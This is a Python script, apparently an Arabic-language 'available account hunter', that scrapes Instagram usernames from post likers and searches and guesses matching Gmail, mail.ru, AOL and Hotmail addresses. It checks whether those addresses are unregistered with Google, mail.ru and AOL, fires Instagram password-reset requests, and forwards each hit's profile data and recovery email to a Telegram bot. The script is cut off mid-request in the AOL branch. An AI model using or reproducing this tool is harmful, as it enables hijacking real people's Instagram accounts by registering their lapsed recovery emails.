import os
import time

try:
    import requests
    import user_agent
    import datetime
    import webbrowser
    import pyfiglet
    import threading
    import signal
except:
    os.system('pip install requests')
    os.system("pip install HamodyTools")
    os.system("pip install instaloader")
    os.system('pip install user_agent')
    os.system('pip install datetime')
    os.system('pip install webbrowser')
    os.system('pip install pyfiglet')
    os.system('pip install threading')
    os.system('pip install signal')
    os.system('pip install pyfiglet')
    os.system("pip install instaloader")
    os.system("clear")
import requests
import os
from uuid import uuid4
import random
from user_agent import generate_user_agent
import requests
from user_agent import generate_user_agent
from datetime import datetime
import datetime
import json
import sys
from time import sleep
from os import system
from datetime import date
import socket
import pyfiglet
import instaloader
import requests, re
import HamodyTools
from HamodyTools import *
import requests, random, threading
import requests
from colorama import Fore, Back

now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t = (mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)

hours = (now.hour)
x = datetime.datetime.now()
g = datetime.datetime(2022, 10, 28, 7, 0, 0)

if (x.strftime("%x")) > (g.strftime("%x")):
    print('\n\n')
    print("     " + 'تم توقيف لـ اداه')
    print('\n\n')
    print(x)

    sys.exit(0)
cookies = input("\x1b[1;37m⚡ Session ID - سيشن ايدي : ")
os.system("clear")
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\033[2;36m'  # سمائي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'  # ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
BBlue = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
a = 0
z = 0
b = 0
j = 0
m = 0
ruu = 0
ru = 0
ma = 0
bp = 0
bk = 0
bd = 0
k = 0
t = 0
x = 0
g = 0
L = 0
h = 0
ci = 0
A = 0
f = 0
a = 0
z = 0
b = 0
j = 0
m = 0
k = 0
t = 0
x = 0
g = 0
L = 0
f = 0
hot = 0
qw = 0
E = 0
Ru = 0
qw = 0
ya = 0
yaa = 0
hh = 0
h = 0
hhh = 0
yaaa = 0
E = 0
zaidip = socket.gethostname()
ipzaid = socket.gethostbyname(zaidip)
print('\n\033[2;90m\rاداة صيد متاحات المدفوعة')
ll = datetime.datetime.now()
r = requests.session()
lll = date.today()
r = requests.session()
print('\n\033[1;36mTele @PPGBB\n')


class login:
    def __init__(self, username, password):
        self.username = username
        self.password = password
        self.request = requests.Session()
        pass

    def csrf(self):
        response = self.request.get('https://www.instagram.com/accounts/login/')
        c = re.findall(r"csrf_token\":\"(.*?)\"", response.text)[0]
        return c

    def session(self):
        response = self.request.post("https://www.instagram.com/accounts/login/ajax/",
                                     headers={'Host': 'www.instagram.com', 'content-length': '333',
                                              'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
                                              'x-ig-app-id': '1217981644879628', 'x-ig-www-claim': '0',
                                              'x-requested-with': 'XMLHttpRequest', 'sec-ch-ua-mobile': '?1',
                                              'x-instagram-ajax': '4b5f8c8eb791', 'viewport-width': '412',
                                              'content-type': 'application/x-www-form-urlencoded', 'accept': '*/*',
                                              'x-csrftoken': self.csrf(),
                                              'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
                                              'x-asbd-id': '198387', 'sec-ch-prefers-color-scheme': 'dark',
                                              'sec-ch-ua-platform': '"Android"', 'origin': 'https://www.instagram.com',
                                              'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors',
                                              'sec-fetch-dest': 'empty', 'referer': 'https://www.instagram.com/'},
                                     data={'username': self.username,
                                           'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{self.password}',
                                           'queryParams': '{}', 'optIntoOneTap': 'false'}).text
        if 'authenticated":true' in response:
            print("login true \n", "=" * 10)
            ses = self.request.cookies["sessionid"]
            return ses
        else:

            print("خطا في التسجيل")
            exit(0)


class checker:
    def __init__(self, username, password):
        self.sessions = login(username, password).session()

    def likes(self):
        global yui
        try:
            url = input(" Enter url post - ارسل رابط البوست :")
            link = url.split("?")[0]
            idpost = requests.get(f"{link}?__a=1&__d=dis").json()["graphql"]["shortcode_media"]["id"]
            response = requests.get(f"https://i.instagram.com/api/v1/media/{idpost}/likers/",
                                    headers={'Host': 'i.instagram.com', 'sec-ch-ua': '"Google',
                                             'x-ig-app-id': '1217981644879628',
                                             'x-ig-www-claim': 'hmac.AR3k4B3cXQdAp9NfDQ2Rw_pvRdaTsgv8uqX2ezXahw5qxj2F',
                                             'sec-ch-ua-mobile': '?1', 'x-instagram-ajax': '1006206784',
                                             'accept': '*/*',
                                             'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
                                             'x-asbd-id': '198387', 'x-csrftoken': 'gJslh1FBsSwCPcWtHYVPRgytWazd7QLA',
                                             'sec-ch-ua-platform': '"Android"', 'origin': 'https',
                                             'sec-fetch-site': 'same-site', 'sec-fetch-mode': 'cors',
                                             'sec-fetch-dest': 'empty', 'referer': 'https://www.instagram.com/',
                                             'accept-encoding': 'gzip,',
                                             'accept-language': 'ar-IQ,ar;q=0.9,en-UM;q=0.8,en;q=0.7,ar-AE;q=0.6,en-US;q=0.5',
                                             'cookie': 'sessionid=' + self.sessions}).json()
            file = open("gmail.txt", "a")
            for i in range(len(response["users"])):
                username = response["users"][i]["username"]
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f'\nUser >> \033[1;36m ' + username)
                Fq = ['@gmail.com', '@mail.ru', '@aol.com', 'hotmail.com']
                Hq = random.choice(Fq)
                file.write(username + f"{Hq}\n")
            file.close()
        except:

            pass

    def search(self):
        try:
            print('⏩ سيتم السحب')
            file = open("gmail.txt", "a")
            file2 = open("PPGBBs.txt", "r")
            while True:
                Search = file2.readline().split('\n')[0]
                if Search == "":
                    break
                response = requests.get(
                    f"https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={Search}&rank_token=0.7458227775054025&include_reel=true",
                    headers={'Host': 'i.instagram.com', 'sec-ch-ua': '"Google', 'x-ig-app-id': '1217981644879628',
                             'x-ig-www-claim': 'hmac.AR3k4B3cXQdAp9NfDQ2Rw_pvRdaTsgv8uqX2ezXahw5qxj2F',
                             'sec-ch-ua-mobile': '?1', 'x-instagram-ajax': '1006206784', 'accept': '*/*',
                             'user-agent': 'Mozilla/5.0', 'x-asbd-id': '198387',
                             'x-csrftoken': 'gJslh1FBsSwCPcWtHYVPRgytWazd7QLA', 'sec-ch-ua-platform': '"Android"',
                             'origin': 'https', 'sec-fetch-site': 'same-site', 'sec-fetch-mode': 'cors',
                             'sec-fetch-dest': 'empty', 'referer': 'https://www.instagram.com/',
                             'accept-encoding': 'gzip,',
                             'accept-language': 'ar-IQ,ar;q=0.9,en-UM;q=0.8,en;q=0.7,ar-AE;q=0.6,en-US;q=0.5',
                             'cookie': 'sessionid=' + self.sessions}).json()
                for i in range(len(response["users"])):
                    username = response["users"][i]["user"]["username"]
                    os.system('cls' if os.name == 'nt' else 'clear')
                print(f'\nUser >> \033[1;36m ' + username)
                Fq = ['@gmail.com', '@mail.ru', '@aol.com', 'hotmail.com']
                Hq = random.choice(Fq)
                file.write(username + f"{Hq}\n")
            file.close()
        except:

            pass


def Gmail():
    global z, a, x, lll, j, g, t, L, f, qw, E, hot
    global cookies
    took = input('\033[1;36m⚡ Token Bot - توكن البوت  :  ')
    if took == '':
        system('clear')
        print('خطا في التوكن')
        exit()
    try:
        idddd = int(input('\033[1;34m⚡ ID Account - ايدي تلكرام : '))
    except ValueError as error:
        system('clear')
        print('خطا في الايدي')
        exit()
    try:
        fil = open('gmail.txt', 'r').read().splitlines()
    except FileNotFoundError as error:
        system('clear')
        print('الملف غير موجود gmail.txt')
        exit()
    for fi in fil:

        url = 'https://b.i.instagram.com/api/v1/accounts/login/'
        B = (fi)
        if ('@gmail.com') in B:
            KL = B.split('@')[0]
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
            uid = str(uuid4())
            data = {
                'uuid': uid,
                'password': 'ffffdddddaaa666',
                'username': B,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'
            }
            re = requests.post(url, headers=headers, data=data).text

            if ('"The username you entered ') in re:
                os.system('cls' if os.name == 'net' else 'clear')
                a += 1
                print(
                    f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
            ############################
            else:
                url3 = 'https://android.clients.google.com/setup/checkavail'
                headers = {
                    'Content-Length': '98',
                    'Content-Type': 'text/plain; charset=UTF-8',
                    'Host': 'android.clients.google.com',
                    'Connection': 'Keep-Alive',
                    'user-agent': 'GoogleLoginService/1.3(m0 JSS15J)', }
                data = json.dumps({
                    'username': B,
                    'version': '3',
                    'firstName': 'AbaLahb',
                    'lastName': 'AbuJahl'})
                res = requests.post(url3, headers=headers, data=data)
                if res.json()['status'] == 'USERNAME_UNAVAILABLE':
                    os.system('cls' if os.name == 'net' else 'clear')
                    qw += 1
                    print(
                        f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
                ############################
                elif res.json()['status'] == 'SUCCESS':
                    os.system('cls' if os.name == 'net' else 'clear')
                    L += 1
                    print(
                        f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
                    ############################
                    G1 = (KL)
                    iii = (G1)
                    try:

                        fi1 = open('cookies.txt', 'r').read().splitlines()
                    except FileNotFoundError as error:
                        system('clear')
                        print('Error File Cookies')
                        exit('')
                    url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
                    head1 = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': '{}'.format(fi1),
                        'referer': 'https://www.instagram.com/{}/'.format(iii),
                        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'snone',
                        'upgrade-insecure-requests': '1',
                        'user-agent': generate_user_agent(),

                    }
                    rr = requests.get(url22, headers=head1).json()

                    try:
                        nam = str(rr['graphql']['user']['full_name'])
                        iddd = str(rr['graphql']['user']['id'])
                        fol = str(rr['graphql']['user']['edge_followed_by']['count'])
                        fols = str(rr['graphql']['user']['edge_follow']['count'])
                        isp = str(rr['graphql']['user']['is_private'])
                        bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
                        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")
                        ree = re.json()
                        dat = ree['date']
                        j += 1
                        headers = {
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'Host': 'i.instagram.com',
                            'Connection': 'Keep-Alive',
                            'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',

                            'Accept-Language': 'en-US',
                            'X-IG-Connection-Type': 'WIFI',
                            'X-IG-Capabilities': 'AQ==',
                        }
                        data = {
                            'ig_sig_key_version': '4',
                            "user_id": iddd
                        }
                        res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',
                                            headers=headers, data=data).json()
                        rs = str(res['obfuscated_email'])
                        tlg = (f'''https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 𝙸𝚂 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴
┗━━━━━━━━⧪━━━━━━━━┛
𝙷𝙸𝚃𖤴 : {j}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\n𝙽𝙰𝙼𝙴 : {nam}\n𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴 : = {iii}\n𝙶𝙼𝙰𝙸𝙻 : {iii}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {fol}\n𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {fols}\n𝙿𝙾𝚂𝚃𝚂 : {bio}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 : {dat}\n𝚁𝙴𝚂𝚃 : {rs}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\nTELE : @PPGBB - @PYTHON_PG
''')
                        ru = requests.post(tlg)
                    except KeyError as error:
                        os.system('cls' if os.name == 'net' else 'clear')
                        E += 1
                        print(
                            f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
        ############################

        if ('@mail.ru') in B:
            KL = B.split('@')[0]

            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
            uid = str(uuid4())
            data = {
                'uuid': uid,
                'password': 'ffffdddddaaa666',
                'username': B,
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'
            }
            re = requests.post(url, headers=headers, data=data).text

            if ('"The username you entered ') in re:
                os.system('cls' if os.name == 'net' else 'clear')
                a += 1
                print(
                    f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
            ############################
            else:
                url = 'https://account.mail.ru/api/v1/user/exists'
                hed = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': '1357',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'cookie': 'mrcu=D1786224E1BC12F18183CADF55C3; b=cEoAAAC6tnQAJwBAAAAA; c=H+IkYgEAAHsTAAAUAAAACQAQ; p=YH0AAMj5nBYA; _fbp=fb.1.1646584355773.524938836; searchuid=7971299131646584355; _gcl_au=1.1.428891087.1646584357; _ym_uid=1646584362430989986; _ym_d=1646584362; _ga=GA1.2.1964204728.1646584379; tmr_lvid=d7c70e0202560d009592c255f6bdb667; tmr_lvidTS=1646584382099; s_cp=dpr=3|scrmax=640; s=rt=1|dpr=3; act=d068fc7785114ef39d3760d952553365; i=AQBcgTdiAQATAAgEAXseAQ==; tmr_detect=0|1647804821602; tmr_reqNum=105; VID=2f459Q2ndao800000b1AH4Y8:::0-0-0-73f3ae2:CAASEBh1j4HRUFseDIQd7prypL4aYGutQx8bS5xcyhBRs9xluNrqNUwws8XLqdRBCzS_tgMVPElGUPQAr9m23IiUCgN1ZITwySBP1rFgYYpT_4IxZ2yNdmlS4JYU03H5trxgnbvkLQy4nrj64NiVfkCPhwso1g',
                    'google-accounts-xsrf': '1',
                    'origin': 'https://account.mail.ru',
                    'referer': 'https://account.mail.ru/signup?from=main_m_touch',
                    'sec-ch-ua': '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': generate_user_agent(),
                    'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=c6264e90-8773-4846-81ef-2445a4586cc3,signin_mode=all_accounts,signout_mode=show_confirmation',
                    'x-client-data': 'CKe1yQEIi7bJAQiktskBCMS2yQEIqZ3KAQj50MoBCJuLywEI7/LLAQi0+MsBCJ75ywEI+/nLAQiv+ssBCKL+ywEIvf7LAQie/8sB',
                    'X-request-id': 'a0f822a5-86a2 -971 b-6aa4-f'
                }
                data = {
                    'email': '{}'.format(B),
                    'name': '{"first":"u","last":"o"}',
                    'birthday': '{"day":5,"month":4,"year":1992}',
                    'htmlencoded': 'false',
                    'utm': '{}',
                    'referrer': 'https://mail.ru/'
                }

                req = requests.post(url, headers=hed, data=data).json()
                G = str(req['body']['exists'])
                if G == 'False':
                    os.system('cls' if os.name == 'net' else 'clear')
                    f += 1
                    print(
                        f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
                    ############################
                    iii = (KL)
                    try:
                        fi1 = open('cookies.txt', 'r').read().splitlines()
                    except FileNotFoundError as error:
                        system('clear')
                        print('File NotFound')
                        exit()
                    url22 = f'https://www.instagram.com/{iii}/?__a=1&__d=dis'
                    head1 = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': '{}'.format(fi1),
                        'referer': 'https://www.instagram.com/{}/'.format(iii),
                        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'snone',
                        'upgrade-insecure-requests': '1',
                        'user-agent': generate_user_agent(),

                    }
                    rr = requests.get(url22, headers=head1).json()
                    try:
                        nam = str(rr['graphql']['user']['full_name'])
                        iddd = str(rr['graphql']['user']['id'])

                        fol = str(rr['graphql']['user']['edge_followed_by']['count'])
                        fols = str(rr['graphql']['user']['edge_follow']['count'])
                        isp = str(rr['graphql']['user']['is_private'])
                        bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
                        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")
                        ree = re.json()
                        dat = ree['date']
                        j += 1
                        headers = {
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'Host': 'i.instagram.com',
                            'Connection': 'Keep-Alive',
                            'User-Agent': 'Instagram 6.12.1 Android (25/7.1.2; 160dpi; 383x680; LENOVO/Android-x86; 4242ED1; x86_64; android_x86_64; en_US)',

                            'Accept-Language': 'en-US',
                            'X-IG-Connection-Type': 'WIFI',
                            'X-IG-Capabilities': 'AQ==',
                        }
                        data = {
                            'ig_sig_key_version': '4',
                            "user_id": iddd
                        }
                        res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',
                                            headers=headers, data=data).json()
                        rs = str(res['obfuscated_email'])
                        tlg = (f'''https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text=𝙸𝙽𝚂𝚃𝙰𝙶𝚁𝙰𝙼 𝙸𝚂 𝙰𝚅𝙰𝙸𝙻𝙰𝙱𝙻𝙴
┗━━━━━━━━⧪━━━━━━━━┛
𝙷𝙸𝚃𖤴 : {j}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\n𝙽𝙰𝙼𝙴 : {nam}\n𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴 : = {iii}\n𝙶𝙼𝙰𝙸𝙻 : {iii}@gmail.com\n𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {fol}\n𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {fols}\n𝙿𝙾𝚂𝚃𝚂 : {bio}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\n𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 : {dat}\n𝚁𝙴𝚂𝚃 : {rs}\n⚋⚋⚋⚋⚋⚋(@PPGBB)⚋⚋⚋⚋⚋⚋\nTELE : @PPGBB - @PYTHON_PG
''')
                        ru = requests.post(tlg)
                    except KeyError as error:
                        E += 1
                        os.system('cls' if os.name == 'net' else 'clear')
                        print(
                            f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
                ############################
                elif G == 'True':
                    os.system('cls' if os.name == 'net' else 'clear')
                    qw += 1
                    print(
                        f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
        ############################

        if ('@aol.com') in B:
            KL = B.split('@')[0]
            headers = {
                'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
            uid = str(uuid4())
            data = {
                'uuid': uid,
                'password': 'ffffdddddaaa666',
                'username': f'{KL}@aol.com',
                'device_id': uid,
                'from_reg': 'false',
                '_csrftoken': 'missing',
                'login_attempt_countn': '0'
            }
            re = requests.post(url, headers=headers, data=data).text

            if ('"The username you entered ') in re:
                os.system('cls' if os.name == 'net' else 'clear')
                a += 1
                print(
                    f'\033[1;32mAvailable Gmail : {L}\nAvailable Hotmail : {hot}\n\033[1;32mAvailable Aol : {t}\n\033[1;32mAvilable Ru : {f}\n\033[1;33mBad insatgram : {a}\n\033[1;33mBad Mail : {qw}\n\033[1;35m[=] - Error User : {E}\n\033[1;36m——————————————×——————————————\n\033[1;32mTelegram = @PPGBB\nChecker mail = 『 {B} 』')
            ############################
            else:

                url = 'https://login.aol.com/account/module/create?validateField=yid'
                head = {
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Content-Length': '18536',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Cookie': 'BX=05cdflhgh88dv&b=3&s=fa; GUC=AQEBAQFhFXNhHkIeKASA; rxx=230ufm9rd1p.2ffkvhk6&v=1; A1=d=AQABBL8hFGECEA1iv_3z3cem0COBi6yvsQIFEgEBAQFzFWEeYQAAAAAA_eMAAAcIvyEUYayvsQI&S=AQAAAngb50-m21aCLls9vcsvdIA; A3=d=AQABBL8hFGECEA1iv_3z3cem0COBi6yvsQIFEgEBAQFzFWEeYQAAAAAA_eMAAAcIvyEUYayvsQI&S=AQAAAngb50-m21aCLls9vcsvdIA; A1S=d=AQABBL8hFGECEA1iv_3z3cem0COBi6yvsQIFEgEBAQFzFWEeYQAAAAAA_eMAAAcIvyEUYayvsQI&S=AQAAAngb50-m21aCLls9vcsvdIA&j=WORLD; AS=v=1&s=9Ach1eVW&d=A6115734a|.jJjUM3.2Sq6mpRaeUvGOFaxkilDMMNq9Ri7WiuICAYOOQc8JzylVD7TqAyOQXyoGr3xjU5It2l8d2Tm2XplfzH_3CxVMv80ojV9Z2.2KK3pELyejomUkEej8.XfKekex.Y8YC.aN2I_2SK8dJrsij_oAiqz0F5q_AxGBEXANzyyOUk4SZBvgOyRlOVZZfqe1tH9zRhKo2pZ1sSrbHl3et7WTdq75c9ftrqF99EdnVhfX55FDU1s18vjW7yhqwnAR4wuzvLUp53LxbG0XAVElc29r1qDyJ5FaMTplnZzc8qs73k0YQ5CBNdeyLQh6_xlUZDPF3EaPrn9XaJEL_IRPJTt9lh7cFMDyMygjEjL3c9.vDyB7bwl6yDEgtWrB0TolID0D_m3WNruvGdsfqqTKHJO.tFLx00tnx_aYJqqVhmRTi_UgdGMAwv_Ns3eT_Ole8uf5okFWiVAN1Att2io_NuZsS3h6kOWMkER6k3h2isdL4pnCJPoskQTs2gDRo.CaRjcNBQk_v985XvaIGGYsw3Kcgm0ZZk.ni3fv.4uUvpxB431Xi_LLXeObPrKXrlLMVNiiAGEwv.0m5TtV41ib11dBba3jtsohTqUZpwIYEU4M4KF3G_N.2SfLRVYMUiNgOlO2ZLmxQmfWGPdysVpSo.UlJUUqEbKPZzJpH4Y_z8BWOeSjIEW9XOKCyf.ZeoXJufQVU5oS1V0_PydswVuYN7c2dOvWA.E7jrTMlPo3ZzaqshPohpubodq8ofYN9UowbOL8eYnyIKny.YvjJb6KLrCr0jersbNU1Z3pBHQutbA9l2iyl4RkMs01sRnL2PVa94n42RmMIEiVYvecUGO~A',
                    'Host': 'login.aol.com',
                    'Origin': 'https://login.aol.com',
                    'Referer': 'https://login.aol.com/account/create?intl=us&src=fp-us&.done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3DkYrCBuoE3NhBcpMPi7iWi4QTnplDEgs0%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E&specId=yidReg&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9ZXRrOURhMkt6bkl5JnM9Y29uc3VtZXJzZWNyZXQmc3Y9MCZ4PWQ2%26intl%3Dus%26nonce%3DkYrCBuoE3NhBcpMPi7iWi4QTnplDEgs0%26redirect_uri%3Dhttps%253A%252F%252Foidc.www.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bopenid%2Bopenid2%2Bsdps-r%26src%3Dfp-us%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vd3d3LmFvbC5jb20vIn0.hlDqNBD0JrMZmY2k9lEi6-BfRidXnogtJt8aI-q2FdbvKg9c9EhckG0QVK5frTlhV8HY7Mato7D3ek-Nt078Z_i9Ug0gn53H3vkBoYG-J-SMqJt5MzG34rxdOa92nZlQ7nKaNrAI7K9s72YQchPBn433vFbOGBCkU_ZC_4NXa9E',
                    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
                    'sec-ch-ua-mobile': '?0',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
